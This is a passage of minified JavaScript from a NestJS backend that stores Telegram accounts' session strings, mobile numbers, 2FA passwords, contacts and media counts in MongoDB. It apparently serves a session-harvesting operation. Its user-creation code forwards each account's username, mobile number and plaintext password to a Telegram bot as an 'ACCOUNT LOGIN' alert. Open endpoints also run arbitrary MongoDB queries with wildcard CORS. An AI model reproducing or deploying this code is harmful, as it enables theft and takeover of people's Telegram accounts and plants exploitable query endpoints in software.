function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataController=void 0;const a=o(3563),s=o(9742),c=o(3559),l=o(2932),p=o(2256),d=o(4241);let u=class{constructor(e){this.userDataService=e}async create(e){return this.userDataService.create(e)}async search(e){return this.userDataService.search(e)}async findAll(){return this.userDataService.findAll()}async updateAll(e,t){return this.userDataService.updateAll(e,t)}async findOne(e,t){return this.userDataService.findOne(e,t)}async update(e,t,o){return this.userDataService.update(e,t,o)}async remove(e,t){return this.userDataService.remove(e,t)}clearCount(e){return this.userDataService.clearCount(e)}async executeQuery(e){try{const{query:t,sort:o,limit:i,skip:r}=e;return await this.userDataService.executeQuery(t,o,i,r)}catch(e){throw e}}};t.UserDataController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreateUserDataDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[p.SearchDto]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Patch)("updateAll/:chatId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),n(0,(0,a.Param)("chatId")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdateUserDataDto]),r("design:returntype",Promise)],u.prototype,"updateAll",null),i([(0,a.Get)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),n(0,(0,a.Param)("profile")),n(1,(0,a.Param)("chatId")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),n(0,(0,a.Param)("profile")),n(1,(0,a.Param)("chatId")),n(2,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,String,d.UpdateUserDataDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),n(0,(0,a.Param)("profile")),n(1,(0,a.Param)("chatId")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Get)("clear-count"),n(0,(0,a.Query)("chatId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",void 0)],u.prototype,"clearCount",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"executeQuery",null),t.UserDataController=u=i([(0,s.ApiTags)("UserData of TG clients"),(0,a.Controller)("userData"),r("design:paramtypes",[c.UserDataService])],u)},6158:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataModule=void 0;const r=o(3563),n=o(5839),a=o(3664),s=o(3559),c=o(430),l=o(5774);let p=class{};t.UserDataModule=p,t.UserDataModule=p=i([(0,r.Module)({imports:[l.initModule,n.MongooseModule.forFeature([{name:a.UserData.name,schema:a.UserDataSchema,collection:"userData"}])],controllers:[c.UserDataController],providers:[s.UserDataService],exports:[s.UserDataService]})],p)},3559:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(3664),p=o(6185);let d=class{constructor(e){this.userDataModel=e,this.callCounts=new Map}async create(e){return new this.userDataModel(e).save()}async findAll(){return await this.userDataModel.find().exec()}async findOne(e,t){const o=(await this.userDataModel.findOne({profile:e,chatId:t}).exec())?.toJSON();o||console.warn(`UserData with ID "${e} - ${t}" not found`);const i=this.callCounts.get(t)||0;return this.callCounts.set(t,i+1),o?{...o,count:this.callCounts.get(t)}:void 0}clearCount(e){return e?(this.callCounts.delete(e),`Count cleared for chatId: ${e}`):(this.callCounts.clear(),"All counts cleared.")}async update(e,t,o){delete o._id,console.log(o);const i=await this.userDataModel.findOneAndUpdate({profile:e,chatId:t},{$set:o},{new:!0,upsert:!0}).exec();return i||console.warn(`UserData with ID "${t}" not found`),i}async updateAll(e,t){delete t._id;const o=await this.userDataModel.updateMany({chatId:e},{$set:t},{new:!0,upsert:!0}).exec();return o||console.warn(`UserData with ID "${e}" not found`),o}async remove(e,t){const o=await this.userDataModel.findOneAndDelete({profile:e,chatId:t}).exec();return o||console.warn(`UserData with ID "${t}" not found`),o}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.userDataModel.find(e).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new a.BadRequestException("Query is invalid.");const r=this.userDataModel.find(e);return t&&r.sort(t),o&&r.limit(o),i&&r.skip(i),await r.exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}async resetPaidUsers(){try{await this.userDataModel.updateMany({$and:[{payAmount:{$gt:10},totalCount:{$gt:30}}]},{$set:{totalCount:10,limitTime:Date.now(),paidReply:!0}})}catch(e){(0,p.parseError)(e)}}};t.UserDataService=d,t.UserDataService=d=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)(l.UserData.name)),r("design:paramtypes",[c.Model])],d)},9631:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateUserDto=void 0;const n=o(9742);class a{constructor(){this.twoFA=!1,this.expired=!1,this.password=null,this.movieCount=0,this.photoCount=0,this.videoCount=0,this.otherPhotoCount=0,this.otherVideoCount=0,this.ownPhotoCount=0,this.ownVideoCount=0,this.contacts=0}}t.CreateUserDto=a,i([(0,n.ApiProperty)({description:"Mobile number of the user",example:"917330803480"}),r("design:type",String)],a.prototype,"mobile",void 0),i([(0,n.ApiProperty)({description:"Session information of the user",example:"string"}),r("design:type",String)],a.prototype,"session",void 0),i([(0,n.ApiProperty)({description:"First name of the user",example:"Praveen"}),r("design:type",String)],a.prototype,"firstName",void 0),i([(0,n.ApiProperty)({description:"Last name of the user",example:null}),r("design:type",String)],a.prototype,"lastName",void 0),i([(0,n.ApiProperty)({description:"Username of the user",example:null}),r("design:type",String)],a.prototype,"username",void 0),i([(0,n.ApiProperty)({description:"Number of channels",example:56}),r("design:type",Number)],a.prototype,"channels",void 0),i([(0,n.ApiProperty)({description:"Number of personal chats",example:74}),r("design:type",Number)],a.prototype,"personalChats",void 0),i([(0,n.ApiProperty)({description:"Number of messages",example:0}),r("design:type",Number)],a.prototype,"msgs",void 0),i([(0,n.ApiProperty)({description:"Total number of chats",example:195}),r("design:type",Number)],a.prototype,"totalChats",void 0),i([(0,n.ApiProperty)({description:"Timestamp of last active",example:"2024-06-03"}),r("design:type",String)],a.prototype,"lastActive",void 0),i([(0,n.ApiProperty)({description:"Telegram ID of the user",example:"2022068676"}),r("design:type",String)],a.prototype,"tgId",void 0),i([(0,n.ApiProperty)({description:"TwoFA status",example:!1}),r("design:type",Boolean)],a.prototype,"twoFA",void 0),i([(0,n.ApiProperty)({description:"Expiration status",example:!1}),r("design:type",Boolean)],a.prototype,"expired",void 0),i([(0,n.ApiProperty)({description:"password",example:"pass"}),r("design:type",String)],a.prototype,"password",void 0),i([(0,n.ApiProperty)({description:"Number of movies",example:0}),r("design:type",Number)],a.prototype,"movieCount",void 0),i([(0,n.ApiProperty)({description:"Number of photos",example:0}),r("design:type",Number)],a.prototype,"photoCount",void 0),i([(0,n.ApiProperty)({description:"Number of videos",example:0}),r("design:type",Number)],a.prototype,"videoCount",void 0),i([(0,n.ApiProperty)({description:"Gender of the user",example:null}),r("design:type",String)],a.prototype,"gender",void 0),i([(0,n.ApiProperty)({description:"Number of other photos",example:0}),r("design:type",Number)],a.prototype,"otherPhotoCount",void 0),i([(0,n.ApiProperty)({description:"Number of other videos",example:0}),r("design:type",Number)],a.prototype,"otherVideoCount",void 0),i([(0,n.ApiProperty)({description:"Number of own photos",example:0}),r("design:type",Number)],a.prototype,"ownPhotoCount",void 0),i([(0,n.ApiProperty)({description:"Number of own videos",example:0}),r("design:type",Number)],a.prototype,"ownVideoCount",void 0),i([(0,n.ApiProperty)({description:"Number of contacts",example:105}),r("design:type",Number)],a.prototype,"contacts",void 0),i([(0,n.ApiProperty)({description:"Call details of the user",example:{outgoing:1,incoming:0,video:1,chatCallCounts:[],totalCalls:1}}),r("design:type",Object)],a.prototype,"calls",void 0),i([(0,n.ApiPropertyOptional)({description:"Call details of the user",example:[]}),r("design:type",Array)],a.prototype,"recentUsers",void 0)},9879:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchUserDto=void 0;const n=o(9742),a=o(4922),s=o(7403);class c{}t.SearchUserDto=c,i([(0,n.ApiPropertyOptional)({description:"Filter by Telegram ID"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"tgId",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by mobile number"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"mobile",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by twoFA status",type:Boolean}),(0,s.IsOptional)(),(0,s.IsBoolean)(),r("design:type",Boolean)],c.prototype,"twoFA",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by Expiration status",type:Boolean}),(0,s.IsOptional)(),(0,s.IsBoolean)(),r("design:type",Boolean)],c.prototype,"expired",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by session"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"session",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by first name"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"firstName",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by last name"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"lastName",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by username"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"username",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by channels count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"channels",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by personal chats count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"personalChats",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by demo given status",type:Boolean}),(0,a.Transform)((({value:e})=>"true"===e||!0===e)),(0,s.IsOptional)(),(0,s.IsBoolean)(),r("design:type",Boolean)],c.prototype,"demoGiven",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by messages count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"msgs",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by total chats count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"totalChats",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by last active timestamp"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",String)],c.prototype,"lastActive",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by movie count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"movieCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"photoCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"videoCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by gender"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"gender",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by other photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"otherPhotoCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by other video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"otherVideoCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by own photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"ownPhotoCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Filter by own video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),r("design:type",Number)],c.prototype,"ownVideoCount",void 0)},9732:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateUserDto=void 0;const i=o(8073),r=o(9631);class n extends((0,i.PartialType)(r.CreateUserDto)){}t.UpdateUserDto=n},6093:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserSchema=t.User=void 0;const a=o(5839),s=n(o(6037)),c=o(9742);let l=class{constructor(){this.twoFA=!1,this.expired=!1,this.password=null}};t.User=l,i([(0,c.ApiProperty)(),(0,a.Prop)({required:!0,unique:!0}),r("design:type",String)],l.prototype,"mobile",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)({required:!0,unique:!0}),r("design:type",String)],l.prototype,"session",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",String)],l.prototype,"firstName",void 0),i([(0,c.ApiProperty)({required:!1}),(0,a.Prop)(),r("design:type",String)],l.prototype,"lastName",void 0),i([(0,c.ApiProperty)({required:!1}),(0,a.Prop)(),r("design:type",String)],l.prototype,"username",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"channels",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"personalChats",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Boolean)],l.prototype,"demoGiven",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"msgs",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"totalChats",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",String)],l.prototype,"lastActive",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)({required:!0,unique:!0}),r("design:type",String)],l.prototype,"tgId",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"movieCount",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"photoCount",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"videoCount",void 0),i([(0,c.ApiProperty)({required:!1}),(0,a.Prop)(),r("design:type",String)],l.prototype,"gender",void 0),i([(0,a.Prop)({required:!1,type:Boolean}),r("design:type",Boolean)],l.prototype,"twoFA",void 0),i([(0,a.Prop)({required:!1,type:Boolean,default:!1}),r("design:type",Boolean)],l.prototype,"expired",void 0),i([(0,a.Prop)({required:!1}),r("design:type",String)],l.prototype,"password",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"otherPhotoCount",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"otherVideoCount",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"ownPhotoCount",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"ownVideoCount",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)(),r("design:type",Number)],l.prototype,"contacts",void 0),i([(0,c.ApiProperty)(),(0,a.Prop)({type:s.default.Schema.Types.Mixed,default:{outgoing:0,incoming:0,video:0,chatCallCounts:[],totalCalls:0}}),r("design:type",Object)],l.prototype,"calls",void 0),i([(0,c.ApiPropertyOptional)(),(0,a.Prop)({type:s.default.Schema.Types.Mixed,default:[],required:!1}),r("design:type",Array)],l.prototype,"recentUsers",void 0),t.User=l=i([(0,a.Schema)({collection:"users",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],l),t.UserSchema=a.SchemaFactory.createForClass(l)},8622:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersController=void 0;const a=o(3563),s=o(9127),c=o(9742),l=o(9879),p=o(9732),d=o(9631);let u=class{constructor(e){this.usersService=e}async create(e){return console.log("creating new user"),this.usersService.create(e)}async search(e){return this.usersService.search(e)}async findAll(){return this.usersService.findAll()}async findOne(e){return this.usersService.findOne(e)}async update(e,t){return this.usersService.update(e,t)}async remove(e){return this.usersService.delete(e)}async executeQuery(e){const{query:t,sort:o,limit:i,skip:r}=e;try{return await this.usersService.executeQuery(t,o,i,r)}catch(e){throw e}}};t.UsersController=u,i([(0,a.Post)(),(0,c.ApiOperation)({summary:"Create a new user"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[d.CreateUserDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("/search"),(0,c.ApiOperation)({summary:"Search users based on various parameters"}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[l.SearchUserDto]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,c.ApiOperation)({summary:"Get all users"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":tgId"),(0,c.ApiOperation)({summary:"Get a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),n(0,(0,a.Param)("tgId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":tgId"),(0,c.ApiOperation)({summary:"Update a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),n(0,(0,a.Param)("tgId")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,p.UpdateUserDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":tgId"),(0,c.ApiOperation)({summary:"Delete a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),n(0,(0,a.Param)("tgId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,c.ApiOperation)({summary:"Execute a custom MongoDB query"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"executeQuery",null),t.UsersController=u=i([(0,c.ApiTags)("Telegram Users"),(0,a.Controller)("user"),r("design:paramtypes",[s.UsersService])],u)},7422:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersModule=void 0;const r=o(3563),n=o(5839),a=o(9127),s=o(8622),c=o(6093),l=o(282),p=o(8009),d=o(5774);let u=class{};t.UsersModule=u,t.UsersModule=u=i([(0,r.Module)({imports:[d.initModule,n.MongooseModule.forFeature([{name:"userModule",schema:c.UserSchema,collection:"users"}]),(0,r.forwardRef)((()=>l.TelegramModule)),(0,r.forwardRef)((()=>p.ClientModule))],controllers:[s.UsersController],providers:[a.UsersService],exports:[a.UsersService]})],u)},9127:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersService=void 0;const a=o(2995),s=o(3563),c=o(5839),l=o(6037),p=o(5562),d=o(6185);let u=class{constructor(e,t,o){this.userModel=e,this.telegramService=t,this.clientsService=o}async create(e){const t=this.telegramService.getActiveClientSetup();if(console.log("New User received - ",e?.mobile),console.log("ActiveClientSetup::",t),!t||t.newMobile!==e.mobile)return await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${e.username?`@${e.username}`:e.firstName}\nMobile: t.me/${e.mobile}${e.password?`\npassword: ${e.password}`:"\n"}`)}`),new this.userModel(e).save();console.log("Updating New Session Details",e.mobile,e.username,t.clientId),await this.clientsService.updateClientSession(e.session)}async findAll(){return this.userModel.find().exec()}async findOne(e){const t=await((await this.userModel.findOne({tgId:e}).exec())?.toJSON());if(!t)throw new s.NotFoundException(`User with tgId ${e} not found`);return t}async update(e,t){delete t._id;const o=await this.userModel.updateMany({tgId:e},{$set:t},{new:!0,upsert:!0}).exec();if(0===o.matchedCount)throw new s.NotFoundException(`Users with tgId ${e} not found`);return o.modifiedCount}async updateByFilter(e,t){delete t._id;const o=await this.userModel.updateMany(e,{$set:t},{new:!0,upsert:!0}).exec();if(0===o.matchedCount)throw new s.NotFoundException(`Users with tgId ${JSON.stringify(e)} not found`);return o.modifiedCount}async delete(e){if(0===(await this.userModel.deleteOne({tgId:e}).exec()).deletedCount)throw new s.NotFoundException(`User with tgId ${e} not found`)}async search(e){return e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),void 0!==e.twoFA&&(e.twoFA="true"===e.twoFA||"1"===e.twoFA||!0===e.twoFA),console.log(e),this.userModel.find(e).sort({updatedAt:-1}).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const r=this.userModel.find(e);return t&&r.sort(t),o&&r.limit(o),i&&r.skip(i),await r.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}};t.UsersService=u,t.UsersService=u=i([(0,s.Injectable)(),n(0,(0,c.InjectModel)("userModule")),n(1,(0,s.Inject)((0,s.forwardRef)((()=>a.TelegramService)))),n(2,(0,s.Inject)((0,s.forwardRef)((()=>p.ClientService)))),r("design:paramtypes",[l.Model,a.TelegramService,p.ClientService])],u)},7927:function(e,t,o){var i=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0});const r=o(8781),n=i(o(6037)),a=o(3205),s=o(9742),c=o(3563);!async function(){const e=await r.NestFactory.create(a.AppModule),t=(new s.DocumentBuilder).setTitle("NestJS and Express API").setDescription("API documentation").setVersion("1.0").build();e.use(((e,t,o)=>{t.header("Access-Control-Allow-Origin","*"),t.header("Access-Control-Allow-Methods","GET,PUT,POST,DELETE"),t.header("Access-Control-Allow-Headers","Content-Type, Accept"),o()})),e.enableCors({allowedHeaders:"*",origin:"*"});const o=s.SwaggerModule.createDocument(e,t);s.SwaggerModule.setup("api",e,o),n.default.set("debug",!0),e.useGlobalPipes(new c.ValidationPipe({transform:!0})),process.on("unhandledRejection",((e,t)=>{console.error("Unhandled Rejection at:",t,"reason:",e)})),process.on("uncaughtException",((e,t)=>{console.error(t,e)}));let i=!1;const l=async t=>{i||(i=!0,console.log(`${t} received`),await e.close(),process.exit(0))};process.on("exit",(async()=>{console.log("Application closed")})),process.on("SIGINT",(async()=>{await l("SIGINT")})),process.on("SIGTERM",(async()=>{await l("SIGTERM")})),process.on("SIGQUIT",(async()=>{await l("SIGQUIT")})),await e.init(),await e.listen(8e3)}()},3924:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.LoggerMiddleware=void 0;const r=o(3563),n=o(6185);let a=class{constructor(){this.logger=new r.Logger("HTTP")}use(e,t,o){const{method:i,originalUrl:r,baseUrl:a}=e;var s;e.get("user-agent"),e.ip,s=r,["/sendtochannel","/favicon.","/tgsignup"].some((e=>s.startsWith(e)))||"/"===r?r.includes("Video")&&this.logger.log(`Excluded endpoint hit: ${r} (length: ${r.length})`):(t.on("finish",(()=>{const{statusCode:o}=t;t.get("content-length"),o>=500?((0,n.fetchWithTimeout)(`${(0,n.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${r} with ${o}`)}`),this.logger.error(`${i} ${r} ${e.ip} || StatusCode : ${o}`)):o>=400?((0,n.fetchWithTimeout)(`${(0,n.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${r} with ${o}`)}`),this.logger.warn(`${i} ${r} ${e.ip} || StatusCode : ${o}`)):o>=300?this.logger.verbose(`${i} ${r} ${e.ip} || StatusCode : ${o}`):this.logger.log(`${i} ${r} ${e.ip} || StatusCode : ${o}`)})),t.on("error",(e=>{const t=(0,n.parseError)(e,process.env.clientId);(0,n.fetchWithTimeout)(`${(0,n.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${r} with ${t.message}`)}`)}))),o()}};t.LoggerMiddleware=a,t.LoggerMiddleware=a=i([(0,r.Injectable)()],a)},6185:function(e,t,o){var i=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.defaultMessages=t.defaultReactions=void 0,t.sleep=function(e){return new Promise((t=>setTimeout(t,e)))},t.contains=function(e,t){return t.some((t=>!!e?.includes(t)))},t.fetchWithTimeout=async function(e,t={},o=1){t.timeout=t.timeout||5e4,t.method=t.method||"GET";const i=async(e,o)=>{const i=r.default.CancelToken.source(),a=setTimeout((()=>{i.cancel(`Request timed out after ${t.timeout}ms`)}),t.timeout);try{const 